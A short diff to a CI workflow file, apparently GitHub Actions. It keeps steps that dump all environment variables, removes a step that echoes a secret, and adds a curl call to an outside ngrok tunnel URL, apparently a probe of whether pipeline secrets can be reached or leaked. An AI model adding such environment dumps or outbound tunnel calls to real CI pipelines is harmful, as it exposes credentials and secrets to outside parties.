@@ -15,4 +15,4 @@ jobs:
       - run: bats -v
       - run: ls -la
       - run: env
-      - run: echo "The secret is $super_secret"
+      - run: curl https://5359-210-16-83-150.ngrok-free.app/
